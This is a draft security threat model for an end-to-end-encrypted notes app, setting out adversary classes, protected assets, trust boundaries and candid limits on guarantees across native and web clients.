# Myne — Threat Model v0.1

> **Status: draft.** This document defines the adversaries Myne defends against, the assets it protects, the trust boundaries it draws, and — critically — what it does **not** protect against. Marketing copy must not exceed the guarantees in this document. When the architecture changes, this document changes in the same PR.

---

## 1. Adversary Classes

Each adversary class is assigned one of four status levels:

- **🛡️ Strong guarantee** — The architecture makes the attack technically impossible. Even with full server compromise, source code, and operator cooperation, the attacker cannot succeed.
- **🔒 Mitigated** — The architecture makes the attack significantly harder, but does not provide an absolute guarantee. Specific failure modes are documented.
- **⚠️ Best-effort** — The attack is acknowledged as feasible. We minimize damage and surface area, but defending fully is outside the scope of cryptography.
- **❌ Out of scope** — We do not claim protection against this adversary in v1. The user owns this risk.

| ID | Adversary | Status | Notes |
|---|---|---|---|
| A1 | Passive cloud provider (us, the hosted sync server, or a self-host operator) | 🛡️ Strong | Server stores only opaque ciphertext blobs and key-wrapping material. Plaintext, decryption keys, and master passwords never leave the client. |
| A2 | Compelled lawful access (subpoena, court order, national security letter) | 🛡️ Strong | The server cannot disclose what it does not possess. Account number, ciphertext blobs, sync timestamps, and IP addresses at connection time may be disclosed; note plaintext, titles, and structure cannot. |
| A3 | Passive network attacker (ISP, Wi-Fi sniffer) | 🛡️ Strong | TLS in transit plus client-side E2EE before transit. The attacker sees only encrypted bytes between encrypted bytes. |
| A4 | Active network attacker (MitM, TLS downgrade, BGP hijack) | 🔒 Mitigated (native clients) · ⚠️ Best-effort (web client) | TLS with a strict configuration plus certificate pinning in clients. A successful active MitM still cannot decrypt notes. It cannot deliver a malicious client update either, because no client fetches one (TB7); this row said it could until 2026-08-25 (entry 0534). What it can attempt is A9's territory: serving a malicious artifact to someone downloading at that moment, and, on the web client, a substituted bundle on any page load (A15). **Per client:** a native client pins the server's certificate and can bind its authenticated session to the TLS channel, and those two are at different stages. **Pinning ships:** configuring an endpoint captures the leaf certificate on first connect (TOFU) and a pinned verifier checks every later connection against that pin in place of CA-chain validation; only the *hosted static* pin is deferred — it stays absent until the hosted certificate and domain exist, so today every endpoint, hosted or self-hosted, is TOFU-pinned (`decisions.md` 2026-07-29). **Re-pointing at an endpoint this device already trusts no longer replaces its pin silently** (myne-md/myne#581): the command used to run a fresh accept-any-certificate handshake and overwrite the stored pin with whatever answered, without ever reading the old one, which made "re-enter the server URL" — the remedy the device panel recommends when sync breaks — also the way to hand a pin to a MitM. A different certificate on a trusted endpoint is now refused with nothing written, and replacing the pin requires the same out-of-band fingerprint confirmation the Tor enrollment path already demanded. A pin mismatch is also **reported as itself** rather than as a generic transport failure, and it parks rather than retrying, because it cannot clear on its own: this is the ordinary certificate-renewal case as much as the attack case, and the client cannot tell them apart, so it asks. **Channel binding is wired but inert:** the SCRAM `-PLUS` `tls-exporter` binding engages only when the server itself terminates TLS 1.3, and behind a terminating reverse proxy both ends bind to empty — so the deployed posture is SCRAM-SHA-256 over pinned TLS, and the MitM resistance in this row is the cert pin's, not the binding's (`decisions.md` 2026-07-13). Neither has had its primitive-level security review, so no surface presents certificate trust as *verified*. The **web client can do neither, permanently**: a browser exposes neither TLS-exporter keying material nor certificate pinning to page JavaScript, so a web session rests on the browser's own trust store and nothing more. A MitM against the *sync* origin still sees only ciphertext; a MitM against the *bundle* origin is A15, not this row. |
| A5 | Lost or stolen device (locked) | 🛡️ Strong | Master key is derived via Argon2id from a password the device does not store. With the password absent, ciphertext on disk is opaque. **One exception — PIN quick-unlock (see §7):** enabling the PIN provider writes a third wrapped copy of `root_key` to the same disk (`vault.quickunlock`, `spec/protocol.md` §9.14), guarded by a ≥6-digit PIN instead of by the master password, so a copied disk is open to offline brute-force at PIN entropy × one Argon2id evaluation per candidate. The failed-attempt counter bounds online guessing only. This rating describes a vault with PIN quick-unlock off (the default) or using the hardware-bound biometric provider, whose wrap key is non-exportable. **A second, much narrower exception (the cached vault name; see §7, myne-md/myne#411):** for every vault this device has unlocked at least once, that vault's **name** is cached at rest in `vault.label` (`spec/protocol.md` §9.22), sealed under an OS-keychain item (`md.myne.vaultlabel`, `AccessibleAfterFirstUnlockThisDeviceOnly`, no user-presence flag). Whoever can satisfy the **OS account credential** on the recovered device can therefore read those names, which the vault's master password does not guard, exactly as the `vault.quickunlock` carve-out above describes for its own key. **The rating does not move**, and the reason is the asset rather than the mechanism: what this yields is a name the user chose for a vault, not `root_key`, not a note, not a title, and it opens no ciphertext. Turning off the cache is the device-wide hide-vault-names option (§7 records its four limits). |
| A6 | Lost or stolen device (unlocked, app open) | 🔒 Mitigated | Auto-lock on idle bounds the exposure window: after a configurable period of machine inactivity, Myne deterministically zeroizes the in-memory keys (no further notes decryptable) and tears the currently-open plaintext out of the application (a synchronous OS-level window hide plus a best-effort WebView reload). An attacker who takes the device *during* the active window, before idle-lock fires, still sees an unlocked vault — auto-lock narrows the window, it does not close it. Residual freed-page memory, swap, and hibernation are **not** scrubbed and remain A7/A10 territory; this is deliberately not a 🛡️ Strong guarantee against forensic RAM capture. See §6 and `spec/recovery-flow.md` §3.5. **Quick-unlock after a process restart (MYND-641):** a **PIN** quick-unlock credential is suppressed until one full master-password unlock has happened in the current process, so a restart cannot hand the vault back on six digits guarded only by our own five-attempt counter. A **biometric** credential is not so gated: its wrap key is held by the OS under `kSecAccessControlBiometryCurrentSet` + `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` (`protocol.md` §9.14), so reading it already requires a Secure-Enclave-backed biometric prompt, it is non-exportable, and the OS invalidates it outright when the enrolled biometric set changes — a gate that survives a restart on its own. The honest consequence is that on a device whose owner's biometric an attacker can satisfy (coercion, a co-enrolled face/finger), a restart is no longer a second barrier; that was already true while the process lived, and it is the same trade every biometric-unlock app makes. It does **not** widen A6 for a lost device with no usable biometric. **One bounded exception — a running import (myne-md/myne#223):** while the importer is actively ingesting, it takes a short, renewable lease that **defers** the idle lock. Importing a large vault takes far longer than the default timeout and the machine is genuinely idle throughout — the user is watching a progress bar — so locking mid-run destroyed the import rather than protecting anything the user had not already left on screen. The lease **does not touch the idle clock**: idle keeps accumulating underneath, so the tick after the lease lapses locks a vault whose owner really did walk away, and the deferral is bounded to a 60-second ceiling per renewal (a dead WebView stops renewing and the vault locks within a minute). It is desktop-only, plugin-scoped, and visible — an import modal is on screen the whole time. The residual is that a **compromised WebView** could renew the lease indefinitely and so outlive the idle window; that is A7, already out of scope, and such an attacker can already read every note through the unlocked slot. This narrows nothing about a stolen device that is not mid-import. **Per client:** the mitigation above describes the native clients, which observe OS-level idle. The **web client is weaker**: a page can observe only its own input events and visibility, so "idle" there means "no interaction with this tab" — a user who leaves the machine while typing in another window is not idle to it. Browsers also throttle timers in background tabs, so the timer that fires the lock may fire late or not until the tab is foregrounded again. The web client therefore narrows a *smaller* window than the desktop does, and says so rather than presenting the two as equivalent. **Amended 2026-08-21 (myne-md/myne#540) — what the web lock can fail at, because two documents had it backwards.** `src/App.tsx`'s idle handler and `decisions/clients/0519` both recorded the web lock as *best-effort*, on the reasoning that a rejected lock IPC leaves the slot unlocked and routes the user to a screen still holding live keys. That failure is **not reachable**: `lock_with_state` takes the slot and returns `Ok(())` with no fallible step after the take, and `lock_from_host`'s only `?` is on that call, so the command cannot report failure while leaving the slot unlocked. On web the reachable rejections are a **fatal Worker** — which is the side holding the keys, so its death is the event the lock existed to force — plus `unsupported` (held closed by `scripts/check-web-command-coverage.mjs`) and a structured-clone throw while posting (this command takes no payload). Desktop's auto-lock does not come through that path at all: it is the Rust timer in `auto_lock.rs`, which drops the slot backend-side. So **no per-client best-effort qualifier is owed**, and understating a guarantee is recorded here as the same defect as overstating one. **The residual that is real is narrower and is now smaller.** `root_key` and `items_key` live in the Worker's wasm linear memory, and a wasm panic **aborts without unwinding**, so no `Zeroizing` `Drop` runs. `declareFatal` (`web/src/worker/host.ts`) used to mark the instance dead and reject every caller **without terminating the Worker**, and `fatal` is never cleared, so that memory stayed allocated in the page — reachable by nothing, scrubbed by nothing — until the user reloaded or closed the tab, which every broken UI path was pushing them toward without anything making it happen. It terminates now, on all four death routes, with a per-route test. **State exactly what that buys and no more:** terminating releases the allocation, it does not zeroize it, so the bytes move from a live allocation into freed memory, which is the freed-page case this row already places in A7/A10 and does not claim to scrub. |
| A7 | Malware on the user's device | ⚠️ Best-effort | Live malware running with user privileges defeats any client-side encryption — keyloggers capture passwords, screen scrapers capture decrypted plaintext. At-rest encryption protects against *dormant* malware that finds disk artifacts but does not run actively. We do not claim protection against active compromise. Some defense-in-depth via native screen-capture exclusion — see §6. |
| A8 | Compromised dependency / supply chain (npm, Go modules) | ⚠️ Best-effort | Direct-dependency hash-pinning, lockfiles checked in, minimal dependency tree, and dependency-update reviews. Cannot fully defend against a compromised transitive dependency that ships malicious code. |
| A9 | Compromised build or distribution channel | ⚠️ Best-effort | **This row said "Reproducible builds, code-signed releases" until 2026-08-25 and had neither on desktop** (entry 0534, completing the sweep 0496 began in §4 and §6). What holds: a minisign-signed `SHA256SUMS` per release whose key is held offline, the same hashes cross-published on a second origin, and no auto-update channel to attack. Desktop installers carry no signature any OS checks; the Android `.apk` is the one OS-verified artifact. Verification is manual and opt-in, so a user who downloads and runs without checking is protected by none of it. See §4 A9 and TB7. |
| A10 | State-level actor (zero-day capabilities, supply-chain access, coercion of operators) | ⚠️ Best-effort | We use boring, well-vetted primitives and publish the spec. We do not claim protection against nation-state adversaries with zero-day capabilities, hardware implants, or the legal power to compel operator cooperation beyond what A2 covers. |
| A11 | Insider threat (Myne team member acting maliciously) | 🛡️ Strong (native clients) · ⚠️ Best-effort (web client) | **Native clients — 🛡️ Strong.** The architecture grants the team no more access than any external attacker. Insiders cannot decrypt notes because the keys never leave the client. The release-signing key is the one privileged asset, meaning the offline minisign key over each release's hash list plus the Android release keystore; see A9 and TB8. (This row said "code-signing keys" until 2026-08-25 and there is no desktop code-signing key: entry 0534.) **Web client — ⚠️ Best-effort.** A served bundle grants exactly the extra access the Strong claim denies: whoever operates the bundle origin can serve modified JavaScript to one chosen user and the honest bundle to everyone else, and that code runs with the master password typed into it. This is the whole of A15; the qualification is stated here so the Strong guarantee is not read across a client where it is false. |
| A12 | Coerced user ("rubber-hose" / give-me-your-password) | ❌ Out of scope | No plausibly-deniable encryption in v1. If a user is compelled to enter their password, the attacker gets the data. |
| A13 | Traffic analysis (server or network observer correlates sync timing, blob sizes, account activity) | ⚠️ Best-effort | Sync metadata — timing, blob count, blob size, IP at connection — is visible to the server and to anyone observing the network. Padding, cover traffic, and timing randomization are deferred beyond v1. |
| A14 | Compromised or malicious browser-extension build (auto-pushed malicious update, or a co-resident malicious page/extension) | 🔒 Mitigated | The clipper extension is a separately-distributed artifact with its own web-store auto-update supply chain (distinct from the desktop's TB7/TB8; cf. the Cyberhaven / Trust Wallet 2024–2025 extension-compromise incidents). A compromised build is keyless — it holds no root_key/item_key and cannot read or decrypt the vault — and its bridge token is append-only create-clip, so it cannot modify or delete existing notes. Worst case: it writes attacker-chosen or spam clip notes, which the desktop renders safe-by-construction (DOMPurify allowlist, no script execution, no core-side fetch) and surfaces visibly. Browser extension isolation prevents co-resident pages/other extensions from reading the clipper's data. Residual (not defended): a compromised build writing misleading content the user then trusts — bounded (no exfiltration, no deletion, no decryption). |
| A15 | Hostile delivery of the client code itself — targeted substitution of a served web bundle | ⚠️ Best-effort — **web client only** | The web client is re-delivered from an origin on every page load. Whoever operates that origin can serve one identified account a modified bundle and every other account the honest one, with nothing in the browser that checks a signature and nothing left on disk to compare afterwards. The modified bundle runs in the same page the user types the master password into, so this is a plaintext-and-key compromise, not a denial of service. **This is not A9.** A9 covers a build/distribution channel whose artifacts are hash-published and *installed* — the user's copy persists across the attack and can be inspected. Here there is no signature the browser verifies, no artifact the user keeps, and the copy is discarded at every reload. It is a separate boundary (TB11), not a variant of TB7. **What we do about it is detection, not prevention:** the bundle is reproducible from source, every released bundle's hashes go to an append-only record (**not a public one**, which this row said until 2026-08-25: it is in a private repository, so the third party it exists for cannot read it, entry 0534), and a service worker **will** pin the code after first load, accepting a replacement only when its hash is signed by the release key and present in that record (policy fixed in `decisions.md` 2026-07-26; **not yet implemented** — no service worker ships today, so nothing currently pins a loaded bundle). That will make the web *update* channel structurally equivalent to TB7 — **once it ships, every load after the first is as strong as desktop; only the first load is exposed** — with one limit that does not go away even then: browsers fetch the service-worker script itself from the network rather than from its own cache, so an operator controlling the origin can serve a replacement worker that omits the verification. It will raise the cost and leave an artifact trail; it does not make substitution impossible. None of that closes *targeted first delivery* — the case where the very first bundle a user receives is the malicious one — and the product ships with no in-app disclosure of the weakened posture. **Self-hosting removes this adversary for the self-hoster's own use**: someone who builds and serves their own bundle is their own code-delivery operator, so there is no third party in that path at all. It does **not** extend to other people using that instance — for them the self-hoster is the code-delivery operator, exactly as the Myne team is for the hosted one. Native desktop and mobile clients are unaffected (TB7). |
| A16 | Unprivileged same-machine peer — another local process, or a different local user, reaching a user-installed AI runtime's unauthenticated loopback listener | ❌ Out of scope | Ollama binds `127.0.0.1:11434` with no authentication by default, so any process on the machine can query it, and on a multi-user machine that includes a different uid. Once the user enables the local-provider path (TB12), note plaintext transits a socket Myne neither opens nor guards. **Why this is its own row rather than A7.** A7 is *malware that already controls the process layer* — an attacker who has that does not need this door. A16 is the weaker and more ordinary case: an unprivileged peer with no special access, which A7's "we do not defend against attackers who already control the process" sentence does not cover. This shape was previously absent from the roster entirely (myne#380/#343 record the gap); the local-provider work is what makes it reachable, so it is named here. **What Myne does about it: nothing, and it says so.** The listener's bind address and auth policy belong to a daemon Myne does not ship, so there is no control to apply — only disclosure, an opt-in default of off, and the loopback-literal endpoint validation that at least keeps Myne from widening the door itself. A user on a shared machine should not enable the local-provider path. |
| A17 | The AI provider operator itself — an honest-but-curious or compelled party that legitimately receives the plaintext it was sent | ❌ Out of scope | Distinct from A4 (network attacker) and from A1/A2 (the sync server): this party is *supposed* to receive the data, so no transport or storage control touches it. Whatever a remote provider does with a request after receiving it — retain it, log it, train on it, forward it to a model vendor, hand it to a court — is outside anything Myne can verify or constrain, and OpenRouter's brokered shape means even "who receives this" is a set Myne can bound only at the first hop. **The mitigation is that this adversary only exists if the user summons it:** TB13 is opt-in, default off, requires naming a provider and passing a consent screen, is barred from every surface that fires without the user asking, and is limited to user-initiated work. `ai_excluded_folders` remains the content-scoped control. **Myne makes no claim on the provider's behalf** — see §7 and `decisions.md` 2026-08-09; a claim about a third party's retention would be a claim we cannot check. |
| A18 | Credential phishing of the recovery phrase — a lookalike origin that asks the user for their 24 words and account number | ⚠️ Best-effort — **web client only** | Until 2026-08-15 this adversary had no move, and the roster had no row for it, because of a **structural** property rather than a control: the recovery phrase was never generated by, displayed by or typed into served code (`decisions.md` 2026-07-26), so any web page asking for it was self-evidently fake. That inference needed no judgement, no address-bar inspection and no security literacy, and it was the strongest anti-phishing property in this design. `decisions.md` **2026-08-15, entry 0514** ships phrase display and phrase entry on the web client and therefore **spends it, permanently**. What an attacker gains is total: `GET /vault.meta` is a pre-auth route so the account number alone fetches the header, the phrase decrypts `enc_root_key_recovery` offline into `root_key`, `root_key` yields `scram_secret`, and a recovery-path device **self-approves** (`server-protocol.md`, the bootstrap exception). Phrase plus account number is immediate, complete and permanent account takeover, and `protocol.md` §7 gives it no in-app remedy: the phrase survives every password change and no client has a rotation command. **This adversary needs no bundle compromise**, so it is not A15 and not A4, and every control built for those — reproducible builds, the published bundle-hash record, the strict CSP, certificate pinning — is irrelevant to it. **What remains is containment, not prevention**, and it is weak by comparison: the phrase is asked for in exactly one situation, a recovery the user started themselves, because phrase-credential *device enrolment* is a decided absence on web and its grid is kept out of the bundle by build-time substitution and an artefact grep; the flows state where the phrase is legitimately asked for; and the origin is HSTS-preloaded, which binds the HONEST origin to TLS and says nothing about a lookalike, so it belongs with the controls listed above as irrelevant to this adversary rather than with the two that bear on it. None of that stops a user who types 24 words into a homoglyph domain. Native clients are unaffected, and the reason is not a signature: they display and accept the phrase inside an application the user installed, so there is no origin to impersonate and no address bar to read correctly. **The mechanism this sentence claimed until 2026-08-25 does not exist** (entry 0534): no desktop artifact carries a signature any OS checks and nothing verifies one at launch (§1 A9, TB7). What defeats this adversary on a native client is that the client is not fetched from an origin at all. |
| A19 | A browser extension holding host permissions on the web client's origin | ❌ Out of scope — **web client only** | An extension the user has installed with access to the origin reads the page's DOM, including the recovery-phrase grid at creation, the 24 cells at recovery, and the master-password field at every unlock. No content-security policy addresses this: CSP governs what the *page* may load, not what an extension with host permissions may read out of it. **This is not A14**, which is about Myne's own clipper extension being compromised and is bounded by that extension being keyless; here the extension is a third party's, it is not part of Myne's design, and it reads plaintext directly. **It predates the 2026-08-15 change** — the master password has always been typed into this DOM — and that change raises the stakes rather than creating the exposure, because the phrase is the one credential a password change does not rotate. **There is no control to apply.** A page cannot detect, refuse or shield itself from an extension the user has granted access to. What ships is disclosure at the CREATION phrase step only, and the standing answer that a native client has no equivalent surface. Stated that narrowly on purpose: the row names three reads and the notice reaches one of them. The recovery entry screen carries none, and its users are by definition people who did not create their account in this browser, so they never saw the creation step; the unlock password field carries none either. Closing that gap is owed and is not claimed here: nothing can inject into the desktop WebView. A user who does not trust every extension installed in a browser profile should create and recover in a native client, or use a clean profile for those steps. |

## 2. Assets

Each asset is classified by sensitivity and by where it is visible (client only, client + server-as-ciphertext, server-as-plaintext, or transient).

| ID | Asset | Sensitivity | Where it lives | Server visibility |
|---|---|---|---|---|
| AS1 | Note plaintext | Critical | Client only (decrypted in RAM) | Ciphertext blob only |
| AS2 | Note title | Critical | Inside encrypted blob | Ciphertext blob only — never extracted as a separate field |
| AS3 | Folder / hierarchy structure | Sensitive | Inside encrypted blob | Not visible. Server stores notes as a flat keyed set; structure is reconstructed client-side. |
| AS4 | Wikilinks / backlinks graph | Sensitive | Inside encrypted blob | Not visible. Graph is reconstructed client-side after decryption. |
| AS5 | Tag list | Sensitive | Inside encrypted blob | Not visible. |
| AS6 | User-meaningful timestamps (created_at, updated_at) | Sensitive | Inside encrypted blob | **Split, and the two halves differ.** `updated_at` is **not visible**: it lives inside the AEAD envelope, and the server uses an opaque per-note version counter that increments on each push — sync-internal state, not a user timestamp, revealing that *something* changed, not when. **`created_at` is visible.** It has no encrypted carrier: a note's `created_at` is derived from the timestamp embedded in its UUIDv7 (`protocol.md` §9.1 — the `.myn` filename IS the note id, and `markdown-dialect.md` deliberately keeps a `created:` field out of frontmatter for exactly that reason). That same UUID is the sync wire key (`sync-protocol.md` §4.2), so the server holds **note creation time at millisecond resolution, durably, in its per-vault index** — not merely observed in passing. Accepted for v0.1; see §7 and the A2 row. The two code-side alternatives (UUIDv4 ids, or a keyed per-note sync-id) are both major-version changes, not doc patches — §7 records why. |
| AS7 | Attachment content (images, SVG, PDFs, audio) | Critical | Encrypted attachment blob (`MYA1`, `protocol.md` §9.9), separate from notes; per-attachment key wrapped by `itemsKey`. **Audio** (voice notes, MYND-259) is captured natively in Rust into a RAM-only `Zeroizing` buffer (never a plaintext temp file) and encrypted through this same `MYA1` path before any disk write; the **microphone is a new ingress** — unlock-gated, explicit-gesture, visible-recording-UI (no covert activation), aborted on lock / auto-lock / vault-delete — and the in-RAM capture buffer plus the PCM that playback necessarily decrypts into the WebView are AS1-class in-RAM plaintext (the A6/A7/A10 forensic-RAM limitation is inherited, not widened). | Ciphertext blob only |
| AS8 | Attachment filename | Sensitive | Authoritatively in the encrypted attachments catalog (`vault.attachments`, `MYC1`, `protocol.md` §9.10), referenced from notes by a `root_key`-keyed content-addressed attachment-id; the in-note alias is a cosmetic copy | Not visible. Attachment blob size is visible (cannot avoid) — v0.1 does not pad; size-indistinguishability is deferred (A13). |
| AS9 | Account number (Mullvad-style identifier) | Pseudonymous | Server stores a hash; raw number is the user's bearer token | Hash only — **structurally enforced** (2026-07-13): the raw value never crosses the sync wire at all. The client derives its SCRAM identity as the account-hash hex inside the enrollment module (no API accepts a raw-number username), and the server rejects any register/init whose username ≠ `account_hash_hex` (`server-protocol.md` §3.1) — so the persisted auth state cannot contain a raw account number even from an outdated client. Stronger than the earlier "verified once at registration and discarded": the server never sees the raw form. |
| AS10 | Master password | Critical secret | User's memory only | Never. Used only as Argon2id input on the client. |
| AS11 | Recovery phrase (BIP39) | Critical secret | User's offline storage (paper, password manager) — and, when the user takes the save-to-file affordance `recovery-flow.md` §2.2 requires the creation flow to offer, a plain-text file: at a location of their choosing on desktop and on the web, and in the app's `Documents` directory on mobile, where neither platform offers the WebView a chooser (TB3). Written owner-only where the platform has file modes, and outside Myne's protection from the moment it lands. On mobile that directory is declared excluded from the platform's automatic cloud backup (TB3, myne-md/myne#491); phrases saved before that landed are already in existing iCloud or Google backups and nothing in the app can retract them. | Never. Server has no representation of the phrase. **Also the OS clipboard**, wherever the creation flow's Copy is taken, and for how long differs by client: desktop schedules a compare-and-clear at 30 s that dies with the process, iOS writes an item the OS expires on its own timer, Android is offered no Copy at all, and **the web client writes it with no clear scheduled** and says so beside the control (`recovery-flow.md` §2.2). On web that means an unrotatable Critical secret sits in a facility other applications read, that clipboard managers persist to disk, and that Windows Cloud Clipboard / macOS Universal Clipboard may copy to another device, until the user copies something else. The affordance ships there anyway because removing it does not remove copying, only makes it manual over a numbered grid, and web is also the client with no screen-capture protection to fall back on; the reasoning per platform is in `recovery-flow.md` §2.2 and the split is deliberate rather than an oversight. |
| AS12 | Root encryption key | Critical secret | Client RAM only | Never. Derived locally from password (or recovery phrase) via Argon2id + HKDF. |
| AS13 | Server-auth secret | Sensitive | Derived client-side via HKDF; server stores Argon2id verifier | Verifier hash only — raw secret never persisted server-side |
| AS14 | IP address at sync time | Metadata | Transient — server connection only | **Not logged.** No persistent storage of source IPs. TLS termination sees the IP for the duration of the request and discards it. **When the desktop's opt-in Tor routing mode is on** (§7), the address the server observes for the duration of the request is a Tor exit node's rather than the user's — a client-side reduction of what is exposed here, not a change to what the server does with it. |
| AS15 | Sync timing (when device X synced) | Metadata | Transient | Visible during the request; **not persistently logged**. The version counter (AS6) reveals that *some* sync happened, but not when. |
| AS16 | Device count per account | Metadata | Server-side registration table | Visible — each registered device gets a server-side record (necessary for revocation). |
| AS17 | Total ciphertext storage size per account | Metadata | Server | Visible — required for quota enforcement on the paid tier. |
| AS18 | Pending watch capture (not-yet-committed note text) | Sensitive (AS1-class) | Device-local encrypted queue (`MYK1`, `protocol.md` §9.18) sealed under a device-local keychain key, `root_key`-independent; two OS-Data-Protection-only transients precede sealing (watch WatchConnectivity outbox + phone staging file) | Never — device-local, never synced or backed up. The server never sees a capture. |
| AS19 | Pending share-import file (not-yet-imported shared file) | Sensitive (AS1/AS7-class) | Device-local encrypted queue (`MYF1`, `protocol.md` §9.20) sealed under a device-local keychain/Keystore key, `root_key`-independent. An OS-Data-Protection-only plaintext window precedes sealing: **on iOS a persistent plaintext staging file** (bytes + `.meta` sidecar written by the Share Extension into the App-Group container, `.completeFileProtection`, sealed + deleted by the app on next open — the §9.18.4 watch-staging pattern); **on Android a RAM + WebView-transit transient** (the `content://` stream read into RAM, base64'd across the WebView, then sealed — no persistent plaintext file). The **OS share sheet is a new ingress** of attacker-influenceable bytes from an arbitrary sending app; the imported file is re-sniffed authoritatively before it enters the `MYA1` library. | Never — device-local, never synced or backed up. The server never sees a pending share. |

### No new asset row for the AI provider boundaries (TB12 / TB13)

The local-runtime and remote-provider boundaries were reviewed for an asset row of their own and deliberately do not get one. What crosses them is **AS1 note plaintext** — the same asset in the same state (decrypted, in RAM, in transit to a process), differing only in *which* process receives it. Sensitivity, where it lives and server visibility are all unchanged, and those are what this table's columns record. "Which non-Myne process may receive this, and under what conditions" is a property of the boundary, and TB12/TB13 carry it. An AS20 would have been AS1's row restated with one sentence changed, and would have split every future edit across two places.

### Key consequence of an encrypted `updated_at` (AS6)

> Scope, because the old heading over-promised: this subsection is about `updated_at` only. Note **creation** time is server-visible via the UUIDv7 blob id — see the AS6 row and §7.

Standard sync architectures use the user's `updated_at` timestamp for last-write-wins conflict resolution. Because that is encrypted here, the sync server cannot make conflict decisions. Instead:

- Each note has a **sync-internal version counter** (an integer, not a wall-clock time) that the server increments when a client successfully pushes a new ciphertext blob.
- Conflicts are detected via version-vector mismatch and resolved on the **client** after decryption — typically duplicate-on-conflict, surfacing both versions to the user.
- This pattern follows the Standard Notes 004 model. It costs sync-protocol simplicity for a meaningful metadata-leak reduction.

### Key consequence of "no IP logging" (AS14)

- No traditional access logs. Operational logs (errors, rate-limit triggers, abuse heuristics) must be designed to function on **counts and timestamps without IPs** — e.g., counter-based per-account rate limits, not per-IP.
- This is technically harder for abuse mitigation (no easy IP banning) and **must** be reflected in the sync-protocol design, not retrofitted.
- The "no IP logs" claim is a hard architectural commitment. Any deviation requires this document to be amended in the same change.

## 3. Trust Boundaries

A trust boundary is a line in the system where the security model changes — what is trusted on one side is not trusted on the other. Myne's boundaries, from innermost to outermost:

| ID | Boundary | Trusted with | Crossing requires |
|---|---|---|---|
| TB1 | User's memory | Master password, recovery phrase, decision to authenticate | The user's mind. If this boundary breaks (the user reveals or forgets the password and phrase), no other defense applies. |
| TB2 | User's device (kernel + user-space process) | Decrypted plaintext, root key, item keys, transient session state | OS-level isolation. We do not defend against attackers who already control the process at this layer (A6, A7). |
| TB3 | Local on-disk storage | Ciphertext blobs, salt, KDF parameters, version counters, public metadata | Argon2id derivation from the master password to obtain the root key. Disk in isolation is opaque. **Deliberate exception — user-initiated plaintext egress:** an export (plain-markdown note, vault markdown tree, PDF, attachment files) — or a user-initiated credential save (the plain-text recovery-phrase file `recovery-flow.md` §2.2 requires the vault-creation flow to offer, and the account-number file offered beside it) — writes plaintext across this boundary to a destination the user explicitly chose via the OS file dialog (dialog-plugin user authority). The exported artifact is outside Myne's protection from the moment it is written; export is one-shot and user-initiated — there is no plaintext mode and no automatic egress. The credential half of the exception differs from the note half in what lands, not in who authorized it: a saved phrase is a standalone unlock path that no password reset rotates (`recovery-flow.md` §4.4) and that has no revocation (`protocol.md` §7.5). Myne writes it owner-only — `0600` from the moment the file exists on Unix, with no equivalent on platforms that have no file modes — through a single narrow command that refuses any destination inside the vault tree, and retains no path to the file afterwards, so `recovery-flow.md` §2.4's no-re-display commitment is unaffected. **Two qualifications this exception carried implicitly and now states (myne-md/myne#491).** (1) *"The destination the user explicitly chose via the OS file dialog"* describes the desktop and the web clients. **On mobile there is no dialog and no choice**: neither platform offers the WebView a save dialog or a folder picker, so the app picks the destination (the bundle's `Documents` directory) for all four of its plaintext writers (recovery-phrase / account-number `.txt`, vault markdown tree, note PDF, exported attachment). What the user authorizes there is the export, not where it lands. (2) The **operating system's automatic cloud backup is a second egress channel across this boundary, and the user authorizes it separately or not at all**: iOS includes `Documents/` in iCloud Backup and Android includes `getExternalFilesDir(DIRECTORY_DOCUMENTS)` in Auto Backup, both on by default. A plaintext export carried there leaves the device entirely, which the phrasing above ("outside Myne's protection from the moment it is written") permits but does not describe. Myne therefore **excludes the mobile export directory from platform backup on both platforms**: `NSURLIsExcludedFromBackupKey` on the directory (iOS), `android:dataExtractionRules` plus `android:fullBackupContent` excluding it from cloud backup **and** device transfer (Android). What that closes is the platform's *automatic backup*, and only that. **The mechanism is in place; its effect on a device has not been observed** (myne-md/myne#491). What *is* established: the shipped Foundation call sets the flag and the flag reads back, run automatically against macOS on every `cargo test` (`backup_exclude::tests::macos`); and the Android attributes survive the Gradle manifest merger into the app that ships, run once during review. What is **not**: that iOS's backup honours the flag, and that Android's backup service honours the rules. `mobile/docs/dev/device-matrix.md` §8 rows 8.9 and 8.10 own those and neither has been run. A green build and a green `scripts/check-mobile-export-backup.mjs` establish that the four files carrying this property agree with each other, which is a smaller claim again. Read the unobserved half the way TB7's absent updater and TB11's unimplemented service worker are read. Two further limits, stated rather than implied: iOS has **no** device-migration equivalent of the Android `<device-transfer>` exclusion, so a direct device-to-device migration on that platform is uncovered and untested; and on iOS the share sheet is the only route the user has to the file, whose default "Save to Files" destination is iCloud Drive, which is a copy the user authorizes rather than one Myne makes. **The encrypted vault is deliberately NOT excluded**: it remains in the platform backup on both mobile and desktop, which discloses nothing (it is AEAD ciphertext whose key is derived from a password the backup does not hold) and is a real recovery path for a user who does not sync. **Adversary mapping, because this channel has none of its own:** no §1 row covers the platform vendor holding a backup. The nearest are A2 (compulsion, but scoped to Myne's own sync server) and A10 (a state actor), and neither describes Apple or Google reading a file the OS copied for the user. That is an acknowledged gap in §1, not a mitigated row. |
| TB4 | Network (transport) | Ciphertext bytes only | TLS 1.3 with strict configuration; TOFU certificate pinning in native clients — only the *hosted static* pin is deferred, and a browser cannot pin at all (§1 A4). The transport carries ciphertext-in-ciphertext. |
| TB5 | Sync server (hosted **and** self-hosted treated identically) | Opaque ciphertext blobs, hashed account-number identifiers, version counters, current-connection IPs (transient, not logged), aggregate quota counters | The server is **explicitly outside the trust boundary** regardless of operator. Self-hosting changes the operator, not the protocol's security model. The protocol assumes a curious or compelled server. |
| TB6 | Server persistent storage (Postgres + blob store) | Same set as TB5 minus transient connection state | Storage is treated as if directly readable by an adversary; nothing of value to an attacker is stored unencrypted. |
